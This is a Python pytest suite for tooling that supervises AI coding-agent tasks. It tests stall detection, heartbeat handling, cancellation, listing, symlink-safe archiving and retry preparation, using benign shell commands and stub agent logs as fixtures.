        task_id = "a12345678901"
        now = 2_000
        td = tmp_path / ".ai-bridge" / "tasks" / task_id
        td.mkdir(parents=True)
        (td / "agent-status.md").write_text("Status: running\n", encoding="utf-8")
        (td / "opencode-output.log").write_text(
            "Now the test-only CI workflow (no build-and-push, no deploy):\n",
            encoding="utf-8",
        )
        # A fresh semantic progress artifact was produced after the colon line.
        (td / "consensus.md").write_text("# Agent consensus\n\nChecks are running.\n", encoding="utf-8")
        (td / "attempt-state.json").write_text(
            json.dumps({"attempt_id": "attempt-1", "fingerprint": "fp", "job_id": "job-1"}),
            encoding="utf-8",
        )
        for child in td.iterdir():
            os.utime(child, (now - 500, now - 500))
        os.utime(td / "opencode-output.log", (now - 20, now - 20))
        os.utime(td / "consensus.md", (now - 10, now - 10))

        result = inspect_agent_task(
            self._shell_runner(tmp_path),
            project="my-proj",
            task_id=task_id,
            stale_after_seconds=600,
            reasoning_loop_after_seconds=60,
            trailing_colon_after_seconds=60,
            now_epoch=now,
            job_status=lambda job_id: {"job_id": job_id, "status": "running"},
        )

        assert result["trailing_colon_stall"]["detected"] is False
        assert result["verdict"] != "trailing_colon_stall"
        assert "recovery" not in result

    def test_rejects_invalid_trailing_colon_threshold_before_commands(self):
        calls = []
        with pytest.raises(ValueError):
            inspect_agent_task(
                lambda project, command: calls.append((project, command)),
                project="my-proj",
                task_id="a12345678901",
                trailing_colon_after_seconds=29,
            )
        assert calls == []

    def test_emitted_invoke_without_progress_is_emitted_invoke_stall(self, tmp_path, monkeypatch):
        monkeypatch.delenv("MCP_AGENT_STATE_ROOT", raising=False)
        task_id = "a12345678901"
        now = 2_000
        td = tmp_path / ".ai-bridge" / "tasks" / task_id
        td.mkdir(parents=True)
        (td / "agent-status.md").write_text("Status: running\n", encoding="utf-8")
        # Last meaningful output is an emitted tool-call block, no progress after.
        (td / "opencode-output.log").write_text(
            "\n".join(
                [
                    "Let me run the command now.",
                    "Let me do it.",
                    '<invoke name="bash">',
                    '<parameter name="command">cd /repo && git status</parameter>',
                    "</invoke>",
                ]
            )
            + "\n",
            encoding="utf-8",
        )
        (td / "attempt-state.json").write_text(
            json.dumps({"attempt_id": "attempt-1", "fingerprint": "fp", "job_id": "job-1"}),
            encoding="utf-8",
        )
        (td / "agent-heartbeat.json").write_text(
            json.dumps(
                {
                    "version": 1,
                    "state": "running",
                    "phase": "stall",
                    "updated_at": "2026-09-03T12:00:00Z",
                    "updated_epoch": now - 5,
                    "runner_pid": 123,
                    "exit_code": None,
                }
            ),
            encoding="utf-8",
        )
        for child in td.iterdir():
            os.utime(child, (now - 500, now - 500))
        os.utime(td / "opencode-output.log", (now - 500, now - 500))
        os.utime(td / "agent-status.md", (now - 500, now - 500))

        result = inspect_agent_task(
            self._shell_runner(tmp_path),
            project="my-proj",
            task_id=task_id,
            stale_after_seconds=600,
            reasoning_loop_after_seconds=60,
            trailing_colon_after_seconds=60,
            emitted_invoke_after_seconds=60,
            now_epoch=now,
            job_status=lambda job_id: {"job_id": job_id, "status": "running"},
        )

        assert result["verdict"] == "emitted_invoke_stall"
        assert result["likely_hung"] is True
        assert result["emitted_invoke_stall"]["detected"] is True
        assert result["emitted_invoke_stall"]["last_invoke_line"] == '<invoke name="bash">'
        assert result["emitted_invoke_stall"]["progress_age_seconds"] == 500
        assert result["emitted_invoke_stall"]["continuation_prompt"] == "Продолжай"
        assert result["recovery"]["action"] == "cancel_and_retry_with_continuation"
        assert result["recovery"]["retry_agent_task"]["continuation_prompt"] == "Продолжай"

    def test_fresh_artifact_suppresses_emitted_invoke_stall(self, tmp_path, monkeypatch):
        monkeypatch.delenv("MCP_AGENT_STATE_ROOT", raising=False)
        task_id = "a12345678901"
        now = 2_000
        td = tmp_path / ".ai-bridge" / "tasks" / task_id
        td.mkdir(parents=True)
        (td / "agent-status.md").write_text("Status: running\n", encoding="utf-8")
        (td / "opencode-output.log").write_text(
            "\n".join(
                [
                    "Let me run the command now.",
                    '<invoke name="bash">',
                    '<parameter name="command">cd /repo && git status</parameter>',
                    "</invoke>",
                ]
            )
            + "\n",
            encoding="utf-8",
        )
        # A fresh semantic progress artifact was produced after the emitted call.
        (td / "consensus.md").write_text("# Agent consensus\n\nChecks are running.\n", encoding="utf-8")
        (td / "attempt-state.json").write_text(
            json.dumps({"attempt_id": "attempt-1", "fingerprint": "fp", "job_id": "job-1"}),
            encoding="utf-8",
        )
        for child in td.iterdir():
            os.utime(child, (now - 500, now - 500))
        os.utime(td / "opencode-output.log", (now - 20, now - 20))
        os.utime(td / "consensus.md", (now - 10, now - 10))

        result = inspect_agent_task(
            self._shell_runner(tmp_path),
            project="my-proj",
            task_id=task_id,
            stale_after_seconds=600,
            reasoning_loop_after_seconds=60,
            trailing_colon_after_seconds=60,
            emitted_invoke_after_seconds=60,
            now_epoch=now,
            job_status=lambda job_id: {"job_id": job_id, "status": "running"},
        )

        assert result["emitted_invoke_stall"]["detected"] is False
        assert result["verdict"] != "emitted_invoke_stall"
        assert "recovery" not in result

    def test_terminal_status_not_emitted_invoke_stall(self, tmp_path, monkeypatch):
        monkeypatch.delenv("MCP_AGENT_STATE_ROOT", raising=False)
        task_id = "a12345678901"
        now = 2_000
        td = tmp_path / ".ai-bridge" / "tasks" / task_id
        td.mkdir(parents=True)
        (td / "agent-status.md").write_text("Status: done\n", encoding="utf-8")
        (td / "opencode-output.log").write_text(
            "\n".join(
                [
                    "Let me run the command now.",
                    '<invoke name="bash">',
                    '<parameter name="command">cd /repo && git status</parameter>',
                    "</invoke>",
                ]
            )
            + "\n",
            encoding="utf-8",
        )
        (td / "attempt-state.json").write_text(
            json.dumps({"attempt_id": "attempt-1", "fingerprint": "fp", "job_id": "job-1"}),
            encoding="utf-8",
        )
        for child in td.iterdir():
            os.utime(child, (now - 500, now - 500))

        result = inspect_agent_task(
            self._shell_runner(tmp_path),
            project="my-proj",
            task_id=task_id,
            stale_after_seconds=600,
            reasoning_loop_after_seconds=60,
            trailing_colon_after_seconds=60,
            emitted_invoke_after_seconds=60,
            now_epoch=now,
            job_status=lambda job_id: {"job_id": job_id, "status": "completed"},
        )

        assert result["terminal"] is True
        assert result["verdict"] == "finished"
        assert result["verdict"] != "emitted_invoke_stall"
        assert result["emitted_invoke_stall"]["detected"] is False

    def test_rejects_invalid_emitted_invoke_threshold_before_commands(self):
        calls = []
        with pytest.raises(ValueError):
            inspect_agent_task(
                lambda project, command: calls.append((project, command)),
                project="my-proj",
                task_id="a12345678901",
                emitted_invoke_after_seconds=29,
            )
        assert calls == []

    def test_startup_timeout_status_is_terminal_and_classified(self):
        now = 2_000

        def fake_run_cmd(project: str, command: str) -> dict:
            if command.startswith("ls -ld -- "):
                return {"stdout": "drwxr-xr-x 1 user user 0 path\n", "stderr": "", "exit_code": 0}
            if command.startswith("cat ") and "agent-status.md" in command:
                return {"stdout": "Status: startup-timeout\n", "stderr": "", "exit_code": 0}
            if command.startswith("cat "):
                return {"stdout": "(not found)", "stderr": "", "exit_code": 1}
            if command.startswith("tail -c "):
                return {"stdout": "Failure reason: opencode-startup-timeout\n", "stderr": "", "exit_code": 0}
            if command.startswith("stat -c "):
                return {"stdout": f"20 {now - 700}\n", "stderr": "", "exit_code": 0}
            return {"stdout": "", "stderr": "", "exit_code": 1}

        result = inspect_agent_task(
            fake_run_cmd,
            project="my-proj",
            task_id="a12345678901",
            stale_after_seconds=600,
            now_epoch=now,
        )

        assert result["terminal"] is True
        assert result["verdict"] == "startup_timeout"
        assert result["startup"]["phase"] == "startup"
        assert result["startup"]["startup_timeout"] is True


class TestInspectAgentHeartbeat:
    def test_fresh_runner_heartbeat_does_not_mask_stale_progress(self):
        now = 2_000

        def fake_run_cmd(project: str, command: str) -> dict:
            if command.startswith("ls -ld -- "):
                return {"stdout": "drwxr-xr-x 1 user user 0 path\n", "stderr": "", "exit_code": 0}
            if command.startswith("cat ") and "agent-status.md" in command:
                return {"stdout": "Status: running\n", "stderr": "", "exit_code": 0}
            if command.startswith("cat ") and "attempt-state.json" in command:
                return {
                    "stdout": json.dumps({"attempt_id": "attempt-1", "fingerprint": "fp", "job_id": "job-1"}),
                    "stderr": "",
                    "exit_code": 0,
                }
            if command.startswith("cat ") and "agent-heartbeat.json" in command:
                return {
                    "stdout": json.dumps({
                        "version": 1,
                        "state": "running",
                        "phase": "loop",
                        "updated_at": "2026-09-02T00:00:00Z",
                        "updated_epoch": now - 5,
                        "runner_pid": 123,
                        "exit_code": None,
                    }),
                    "stderr": "",
                    "exit_code": 0,
                }
            if command.startswith("cat "):
                return {"stdout": "(not found)", "stderr": "", "exit_code": 1}
            if command.startswith("tail -c "):
                return {"stdout": "still waiting\n", "stderr": "", "exit_code": 0}
            if command.startswith("stat -c "):
                if "agent-heartbeat.json" in command:
                    return {"stdout": f"120 {now - 5}\n", "stderr": "", "exit_code": 0}
                return {"stdout": f"20 {now - 700}\n", "stderr": "", "exit_code": 0}
            return {"stdout": "", "stderr": "", "exit_code": 1}

        result = inspect_agent_task(
            fake_run_cmd,
            project="my-proj",
            task_id="a12345678901",
            stale_after_seconds=600,
            now_epoch=now,
            job_status=lambda _job: {"status": "running"},
        )

        assert result["runner_heartbeat_fresh"] is True
        assert result["runner_heartbeat"]["state"] == "running"
        assert result["last_activity"]["source"] != "heartbeat"
        assert result["likely_hung"] is True
        assert result["verdict"] == "likely_hung"

    def test_finished_runner_heartbeat_is_returned(self):
        now = 2_000

        def fake_run_cmd(project: str, command: str) -> dict:
            if command.startswith("ls -ld -- "):
                return {"stdout": "drwxr-xr-x 1 user user 0 path\n", "stderr": "", "exit_code": 0}
            if command.startswith("cat ") and "agent-status.md" in command:
                return {"stdout": "Status: needs-review\n", "stderr": "", "exit_code": 0}
            if command.startswith("cat ") and "agent-heartbeat.json" in command:
                return {
                    "stdout": json.dumps({
                        "version": 1,
                        "state": "finished",
                        "phase": "final",
                        "updated_at": "2026-09-02T00:00:00Z",
                        "updated_epoch": now - 1,
                        "runner_pid": 123,
                        "exit_code": 0,
                    }),
                    "stderr": "",
                    "exit_code": 0,
                }
            if command.startswith("cat "):
                return {"stdout": "(not found)", "stderr": "", "exit_code": 1}
            if command.startswith("tail -c "):
                return {"stdout": "done\n", "stderr": "", "exit_code": 0}
            if command.startswith("stat -c "):
                return {"stdout": f"20 {now - 1}\n", "stderr": "", "exit_code": 0}
            return {"stdout": "", "stderr": "", "exit_code": 1}

        result = inspect_agent_task(
            fake_run_cmd,
            project="my-proj",
            task_id="a12345678901",
            now_epoch=now,
        )

        assert result["terminal"] is True
        assert result["verdict"] == "finished"
        assert result["runner_heartbeat"]["state"] == "finished"
        assert result["runner_heartbeat"]["exit_code"] == 0
        assert result["runner_heartbeat_fresh"] is False

    def test_ambiguous_gateway_job_is_finished_not_running(self, tmp_path, monkeypatch):
        monkeypatch.delenv("MCP_AGENT_STATE_ROOT", raising=False)
        task_id = "a12345678901"
        now = 2_000
        td = tmp_path / ".ai-bridge" / "tasks" / task_id
        td.mkdir(parents=True)
        (td / "agent-status.md").write_text("Status: running\n", encoding="utf-8")
        (td / "opencode-output.log").write_text(
            "still printing keepalive\n",
            encoding="utf-8",
        )
        (td / "attempt-state.json").write_text(
            json.dumps(
                {"attempt_id": "attempt-1", "fingerprint": "fp", "job_id": "job-1"}
            ),
            encoding="utf-8",
        )
        (td / "agent-heartbeat.json").write_text(
            json.dumps(
                {
                    "version": 1,
                    "state": "running",
                    "phase": "loop",
                    "updated_at": "2026-09-03T12:00:00Z",
                    "updated_epoch": now - 5,
                    "runner_pid": 123,
                    "exit_code": None,
                }
            ),
            encoding="utf-8",
        )
        for child in td.iterdir():
            os.utime(child, (now - 700, now - 700))
        os.utime(td / "agent-heartbeat.json", (now - 5, now - 5))

        result = inspect_agent_task(
            TestInspectAgentTask._shell_runner(tmp_path),
            project="my-proj",
            task_id=task_id,
            stale_after_seconds=600,
            now_epoch=now,
            job_status=lambda job_id: {"job_id": job_id, "status": "ambiguous"},
        )

        assert result["status"] == "running"
        assert result["job"]["status"] == "ambiguous"
        assert result["runner_heartbeat_fresh"] is True
        assert result["terminal"] is True
        assert result["likely_hung"] is False
        assert result["verdict"] == "finished"
        assert "recovery" not in result


class TestCancelAgentTask:
    def test_cancels_bound_attempt_job(self):
        calls: list[str] = []

        def fake_run_cmd(project: str, command: str) -> dict:
            calls.append(command)
            if command.startswith("ls -ld -- "):
                return {"stdout": "drwxr-xr-x 1 user user 0 path\n", "stderr": "", "exit_code": 0}
            if command.startswith("cat ") and "attempt-state.json" in command:
                return {
                    "stdout": json.dumps({"attempt_id": "attempt-1", "fingerprint": "fp", "job_id": "job-1"}),
                    "stderr": "",
                    "exit_code": 0,
                }
            return {"stdout": "", "stderr": "not found", "exit_code": 1}

        result = cancel_agent_task(
            fake_run_cmd,
            project="my-proj",
            task_id="a12345678901",
            cancel_job=lambda job_id: {"status": "cancelling", "job_id": job_id},
        )

        assert result["cancel_requested"] is True
        assert result["status"] == "cancelling"
        assert result["job_id"] == "job-1"
        assert result["diagnostics"]["inspect_agent_task"]["task_id"] == "a12345678901"
        assert any("attempt-state.json" in command for command in calls)

    def test_refuses_to_guess_job_without_attempt_state(self):
        def fake_run_cmd(project: str, command: str) -> dict:
            if command.startswith("ls -ld -- "):
                return {"stdout": "", "stderr": "No such file or directory", "exit_code": 1}
            return {"stdout": "", "stderr": "", "exit_code": 1}

        result = cancel_agent_task(
            fake_run_cmd,
            project="my-proj",
            task_id="a12345678901",
            cancel_job=lambda _job: pytest.fail("must not cancel without job_id"),
        )

        assert result["status"] == "missing"
        assert result["cancel_requested"] is False

    def test_refuses_unsubmitted_attempt(self):
        def fake_run_cmd(project: str, command: str) -> dict:
            if command.startswith("ls -ld -- "):
                return {"stdout": "drwxr-xr-x 1 user user 0 path\n", "stderr": "", "exit_code": 0}
            if command.startswith("cat ") and "attempt-state.json" in command:
                return {
                    "stdout": json.dumps({"attempt_id": "attempt-1", "fingerprint": "fp", "job_id": None}),
                    "stderr": "",
                    "exit_code": 0,
                }
            return {"stdout": "", "stderr": "", "exit_code": 1}

        result = cancel_agent_task(
            fake_run_cmd,
            project="my-proj",
            task_id="a12345678901",
            cancel_job=lambda _job: pytest.fail("must not cancel without job_id"),
        )

        assert result["status"] == "not-submitted"
        assert result["cancel_requested"] is False


class TestListAgentTasks:
    def test_passes_project_and_requests_newest_first(self):
        calls = []

        def fake_run_cmd(project: str, command: str) -> dict:
            calls.append((project, command))
            return {"stdout": "task-2\ntask-1", "stderr": "", "exit_code": 0}

        result = list_agent_tasks(fake_run_cmd, project="my-proj")
        assert calls == [
            ("my-proj", "ls -ld -- .ai-bridge"),
            ("my-proj", "ls -ld -- .ai-bridge/tasks"),
            ("my-proj", "ls -1t .ai-bridge/tasks/"),
        ]
        assert result["stdout"] == "task-2\ntask-1"

    def test_marks_truncated_task_list(self):
        tasks = [f"task-{idx:02d}" for idx in range(55)]

        def fake_run_cmd(project: str, command: str) -> dict:
            return {"stdout": "\n".join(tasks), "stderr": "", "exit_code": 0}

        result = list_agent_tasks(fake_run_cmd, project="my-proj")
        lines = result["stdout"].splitlines()
        assert lines[:50] == tasks[:50]
        assert lines[50] == "(truncated: showing 50 of 55 tasks)"


class TestArchiveAgentTask:
    def test_passes_project_and_task_id(self):
        calls = []

        def fake_run_script(project: str, script: str) -> dict:
            calls.append((project, script))
            return {"stdout": "ok", "stderr": "", "exit_code": 0}

        result = archive_agent_task(fake_run_script, project="my-proj", task_id="a12345678901")
        assert result["stdout"] == "archived a12345678901"
        assert calls[0][0] == "my-proj"
        script = calls[0][1]
        assert "mv -T -- \"$src\" \"$dst\"" in script
        assert "mkdir -p \"$archive_dir\"" in script
        assert ".ai-bridge/tasks/a12345678901" in script
        assert ".ai-bridge/archive/a12345678901" in script

    @pytest.mark.parametrize(
        ("runner_exit", "expected"),
        [(44, "not found"), (46, "failed to archive"), (48, "already contains")],
    )
    def test_maps_script_failures_without_exposing_internal_paths(self, runner_exit, expected):
        result = archive_agent_task(
            lambda _p, _s: {
                "stdout": "/internal/state/path",
                "stderr": "/internal/state/path",
                "exit_code": runner_exit,
            },
            project="my-proj",
            task_id="a12345678901",
        )
        combined = f"{result['stdout']} {result['stderr']}"
        assert expected in combined
        assert "/internal/state/path" not in combined
        assert result["exit_code"] == 1

    def test_invalid_task_id_raises(self):
        with pytest.raises(ValueError):
            archive_agent_task(lambda p, c: {}, project="p", task_id="bad")

    @staticmethod
    def _shell_runner(cwd):
        def run_script(_project: str, script: str) -> dict:
            result = subprocess.run(
                ["sh", "-c", script],
                cwd=cwd,
                text=True,
                capture_output=True,
                check=False,
            )
            return {
                "stdout": result.stdout,
                "stderr": result.stderr,
                "exit_code": result.returncode,
            }

        return run_script

    def test_source_symlink_fails_closed_without_touching_target(self, tmp_path, monkeypatch):
        monkeypatch.delenv("MCP_AGENT_STATE_ROOT", raising=False)
        task_id = "a12345678901"
        tasks = tmp_path / ".ai-bridge" / "tasks"
        tasks.mkdir(parents=True)
        outside = tmp_path / "outside-source"
        outside.mkdir()
        marker = outside / "marker.txt"
        marker.write_text("keep", encoding="utf-8")
        (tasks / task_id).symlink_to(outside, target_is_directory=True)

        result = archive_agent_task(self._shell_runner(tmp_path), project="p", task_id=task_id)

        assert result["exit_code"] == 1
        assert marker.read_text(encoding="utf-8") == "keep"
        assert (tasks / task_id).is_symlink()
        assert not (tmp_path / ".ai-bridge" / "archive" / task_id).exists()

    def test_archive_dir_symlink_fails_closed_without_external_write(self, tmp_path, monkeypatch):
        monkeypatch.delenv("MCP_AGENT_STATE_ROOT", raising=False)
        task_id = "a12345678901"
        source = tmp_path / ".ai-bridge" / "tasks" / task_id
        source.mkdir(parents=True)
        (source / "marker.txt").write_text("source", encoding="utf-8")
        outside_archive = tmp_path / "outside-archive"
        outside_archive.mkdir()
        archive_link = tmp_path / ".ai-bridge" / "archive"
        archive_link.symlink_to(outside_archive, target_is_directory=True)

        result = archive_agent_task(self._shell_runner(tmp_path), project="p", task_id=task_id)

        assert result["exit_code"] == 1
        assert source.is_dir()
        assert not (outside_archive / task_id).exists()
        assert archive_link.is_symlink()

    def test_destination_symlink_fails_closed_without_overwrite(self, tmp_path, monkeypatch):
        monkeypatch.delenv("MCP_AGENT_STATE_ROOT", raising=False)
        task_id = "a12345678901"
        source = tmp_path / ".ai-bridge" / "tasks" / task_id
        source.mkdir(parents=True)
        archive = tmp_path / ".ai-bridge" / "archive"
        archive.mkdir(parents=True)
        outside = tmp_path / "outside-destination"
        outside.mkdir()
        marker = outside / "marker.txt"
        marker.write_text("keep", encoding="utf-8")
        (archive / task_id).symlink_to(outside, target_is_directory=True)

        result = archive_agent_task(self._shell_runner(tmp_path), project="p", task_id=task_id)

        assert result["exit_code"] == 1
        assert source.is_dir()
        assert (archive / task_id).is_symlink()
        assert marker.read_text(encoding="utf-8") == "keep"

    def test_repeated_archive_is_idempotent_after_first_move(self, tmp_path, monkeypatch):
        monkeypatch.delenv("MCP_AGENT_STATE_ROOT", raising=False)
        task_id = "a12345678901"
        source = tmp_path / ".ai-bridge" / "tasks" / task_id
        source.mkdir(parents=True)
        (source / "source.txt").write_text("source", encoding="utf-8")
        runner = self._shell_runner(tmp_path)

        first = archive_agent_task(runner, project="p", task_id=task_id)
        second = archive_agent_task(runner, project="p", task_id=task_id)

        destination = tmp_path / ".ai-bridge" / "archive" / task_id
        assert first == {"stdout": f"archived {task_id}", "stderr": "", "exit_code": 0}
        assert second == {
            "stdout": f"already archived {task_id}",
            "stderr": "",
            "exit_code": 0,
        }
        assert not source.exists()
        assert (destination / "source.txt").read_text(encoding="utf-8") == "source"

    def test_existing_archive_entry_is_bounded_and_preserves_both_trees(self, tmp_path, monkeypatch):
        monkeypatch.delenv("MCP_AGENT_STATE_ROOT", raising=False)
        task_id = "a12345678901"
        source = tmp_path / ".ai-bridge" / "tasks" / task_id
        source.mkdir(parents=True)
        (source / "source.txt").write_text("source", encoding="utf-8")
        destination = tmp_path / ".ai-bridge" / "archive" / task_id
        destination.mkdir(parents=True)
        (destination / "archived.txt").write_text("archive", encoding="utf-8")

        result = archive_agent_task(self._shell_runner(tmp_path), project="p", task_id=task_id)

        assert result["exit_code"] == 1
        assert "already contains" in result["stderr"]
        assert (source / "source.txt").read_text(encoding="utf-8") == "source"
        assert (destination / "archived.txt").read_text(encoding="utf-8") == "archive"


class TestPrepareAgentTaskRetry:
    @staticmethod
    def _shell_run_cmd(cwd: Path):
        def run_cmd(_project: str, command: str) -> dict:
            result = subprocess.run(
                ["sh", "-c", command],
                cwd=cwd,
                text=True,
                capture_output=True,
                check=False,
            )
            return {
                "stdout": result.stdout,
                "stderr": result.stderr,
                "exit_code": result.returncode,
            }

        return run_cmd

    @staticmethod
    def _shell_run_script(cwd: Path):
        def run_script(_project: str, script: str) -> dict:
            result = subprocess.run(
                ["sh", "-c", script],
                cwd=cwd,
                text=True,
                capture_output=True,
                check=False,
            )
            return {
                "stdout": result.stdout,
                "stderr": result.stderr,
                "exit_code": result.returncode,
            }

        return run_script

    @staticmethod
    def _write_source_task(cwd: Path, task_id: str, *, status: str = "cancelled", job_id: str = "job-1") -> None:
        td = cwd / ".ai-bridge" / "tasks" / task_id
        td.mkdir(parents=True)
        (td / "task.json").write_text(
            json.dumps(
                {
                    "task_id": task_id,
                    "agent": "opencode",
                    "allowed_backends": ["opencode"],
                    "allowed_files": ["src/**"],
                    "forbidden_files": [".env"],
                    "required_checks": ["pytest -q"],
                    "worktree_path": "",
                    "base_ref": "a" * 40,
                    "managed_source_sha256": "",
                    "commit_allowed": False,
                    "push_allowed": False,
                    "created": "2026-09-02T00:00:00+00:00",
                },
                indent=2,
            ),
            encoding="utf-8",
        )
        (td / "current-plan.md").write_text("# Original plan\n\nDo the work.\n", encoding="utf-8")
        (td / "agent-status.md").write_text(f"Status: {status}\n", encoding="utf-8")
        (td / "attempt-state.json").write_text(
            json.dumps({"attempt_id": "attempt-1", "fingerprint": "fp", "job_id": job_id}),
            encoding="utf-8",
        )

    def test_prepares_new_task_from_terminal_source_without_attempt_state(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.delenv("MCP_AGENT_STATE_ROOT", raising=False)
        source = "source-task-001"
        retry = "retry-task-001"
        self._write_source_task(tmp_path, source, status="cancelled", job_id="job-cancelled")

        result = prepare_agent_task_retry(
            self._shell_run_cmd(tmp_path),
            self._shell_run_script(tmp_path),
            project="my-proj",
            source_task_id=source,
            retry_task_id=retry,
            job_status=lambda job_id: {"status": "cancelled", "job_id": job_id},
        )

        assert result["exit_code"] == 0
        assert result["source_task_id"] == source
        assert result["retry_task_id"] == retry
        retry_dir = tmp_path / ".ai-bridge" / "tasks" / retry
        assert retry_dir.is_dir()
        task = json.loads((retry_dir / "task.json").read_text(encoding="utf-8"))
        assert task["task_id"] == retry
        assert task["allowed_files"] == ["src/**"]
        assert not (retry_dir / "attempt-state.json").exists()
        assert not (retry_dir / "opencode-output.log").exists()
        plan = (retry_dir / "current-plan.md").read_text(encoding="utf-8")
        consensus = (retry_dir / "consensus.md").read_text(encoding="utf-8")
        assert "# Agent consensus" in consensus
        assert "Retry of" in consensus
        assert f"- Source task ID: {source}" in plan
        assert f"- Retry task ID: {retry}" in plan
        assert result["next"]["run_agent"] == {"project": "my-proj", "task_id": retry}

    def test_retry_preserves_review_phase_and_terminal_semantics(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.delenv("MCP_AGENT_STATE_ROOT", raising=False)
        source = "source-task-012"
        retry = "retry-task-012"
        self._write_source_task(tmp_path, source, status="cancelled", job_id="job-cancelled")
        source_dir = tmp_path / ".ai-bridge" / "tasks" / source
        contract_path = source_dir / "task.json"
        contract = json.loads(contract_path.read_text(encoding="utf-8"))
        contract["workflow_phase"] = "review"
        contract_path.write_text(json.dumps(contract, indent=2), encoding="utf-8")
        (source_dir / "current-plan.md").write_text(
            build_current_plan(
                task_id=source,
                task="Audit lifecycle",
                workflow_phase="review",
            ),
            encoding="utf-8",
        )

        result = prepare_agent_task_retry(
            self._shell_run_cmd(tmp_path),
            self._shell_run_script(tmp_path),
            project="my-proj",
            source_task_id=source,
            retry_task_id=retry,
            job_status=lambda job_id: {"status": "cancelled", "job_id": job_id},
        )

        assert result["exit_code"] == 0
        retry_dir = tmp_path / ".ai-bridge" / "tasks" / retry
        retry_contract = json.loads((retry_dir / "task.json").read_text(encoding="utf-8"))
        assert retry_contract["workflow_phase"] == "review"
        consensus = (retry_dir / "consensus.md").read_text(encoding="utf-8")
        plan = (retry_dir / "current-plan.md").read_text(encoding="utf-8")
        assert "Workflow phase: review" in consensus
        assert "must not modify source files" in consensus
        assert "evidence-only and terminal" in plan
        assert "Do not transition to implementation" in plan

    def test_retry_preserves_dirty_snapshot_identity_without_recapture(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.delenv("MCP_AGENT_STATE_ROOT", raising=False)
        source = "source-task-011"
        retry = "retry-task-011"
        self._write_source_task(tmp_path, source, status="cancelled", job_id="job-cancelled")
        source_task_path = tmp_path / ".ai-bridge" / "tasks" / source / "task.json"
        contract = json.loads(source_task_path.read_text(encoding="utf-8"))
        contract.update(
            {
                "source_mode": "dirty_worktree_snapshot",
                "source_ref": "b" * 40,
                "source_tree_sha": "c" * 40,
                "managed_source_sha256": "d" * 64,
            }
        )
        source_task_path.write_text(json.dumps(contract, indent=2), encoding="utf-8")

        result = prepare_agent_task_retry(
            self._shell_run_cmd(tmp_path),
            self._shell_run_script(tmp_path),
            project="my-proj",
            source_task_id=source,
            retry_task_id=retry,
            job_status=lambda job_id: {"status": "cancelled", "job_id": job_id},
        )

        assert result["exit_code"] == 0
        retry_contract = json.loads(
            (tmp_path / ".ai-bridge" / "tasks" / retry / "task.json").read_text(
                encoding="utf-8"
            )
        )
        assert retry_contract["base_ref"] == "a" * 40
        assert retry_contract["source_mode"] == "dirty_worktree_snapshot"
        assert retry_contract["source_ref"] == "b" * 40
        assert retry_contract["source_tree_sha"] == "c" * 40
        assert retry_contract["managed_source_sha256"] == "d" * 64

    def test_continuation_prompt_is_written_to_retry_plan(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.delenv("MCP_AGENT_STATE_ROOT", raising=False)
        source = "source-task-010"
        retry = "retry-task-010"
        self._write_source_task(tmp_path, source, status="cancelled", job_id="job-cancelled")

        result = prepare_agent_task_retry(
            self._shell_run_cmd(tmp_path),
            self._shell_run_script(tmp_path),
            project="my-proj",
            source_task_id=source,
            retry_task_id=retry,
            job_status=lambda job_id: {"status": "cancelled", "job_id": job_id},
            continuation_prompt="Продолжай",
        )

        assert result["exit_code"] == 0
        assert result["continuation_prompt"] == "Продолжай"
        plan = (tmp_path / ".ai-bridge" / "tasks" / retry / "current-plan.md").read_text(encoding="utf-8")
        assert "## Continuation prompt" in plan
        assert "Продолжай" in plan
        assert "do not repeat intent-only planning" in plan

    def test_refuses_retry_when_source_job_is_active(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.delenv("MCP_AGENT_STATE_ROOT", raising=False)
        source = "source-task-002"
        self._write_source_task(tmp_path, source, status="running", job_id="job-running")

        result = prepare_agent_task_retry(
            self._shell_run_cmd(tmp_path),
            self._shell_run_script(tmp_path),
            project="my-proj",
            source_task_id=source,
            retry_task_id="retry-task-002",
            job_status=lambda job_id: {"status": "running", "job_id": job_id},
        )

        assert result["exit_code"] == 1
        assert result["code"] == "AGENT_TASK_NOT_TERMINAL"
        assert not (tmp_path / ".ai-bridge" / "tasks" / "retry-task-002").exists()

    def test_refuses_to_overwrite_existing_retry_task(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.delenv("MCP_AGENT_STATE_ROOT", raising=False)
        source = "source-task-003"
        retry = "retry-task-003"
        self._write_source_task(tmp_path, source, status="failed", job_id="job-failed")
        (tmp_path / ".ai-bridge" / "tasks" / retry).mkdir(parents=True)

        result = prepare_agent_task_retry(
            self._shell_run_cmd(tmp_path),
            self._shell_run_script(tmp_path),
            project="my-proj",
            source_task_id=source,
            retry_task_id=retry,
            job_status=lambda job_id: {"status": "failed", "job_id": job_id},
        )

        assert result["exit_code"] == 1
        assert result["code"] == "ALREADY_EXISTS"

    def test_allows_retry_for_never_submitted_attempt(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.delenv("MCP_AGENT_STATE_ROOT", raising=False)
        source = "source-task-004"
        retry = "retry-task-004"
        self._write_source_task(tmp_path, source, status="created", job_id="")
        td = tmp_path / ".ai-bridge" / "tasks" / source
        (td / "attempt-state.json").write_text(
            json.dumps({"attempt_id": "attempt-1", "fingerprint": "fp", "job_id": None}),
            encoding="utf-8",
        )

        result = prepare_agent_task_retry(
            self._shell_run_cmd(tmp_path),
            self._shell_run_script(tmp_path),
            project="my-proj",
            source_task_id=source,
            retry_task_id=retry,
            job_status=lambda _job_id: {"status": "missing"},
        )

        assert result["exit_code"] == 0
        assert (tmp_path / ".ai-bridge" / "tasks" / retry / "task.json").is_file()
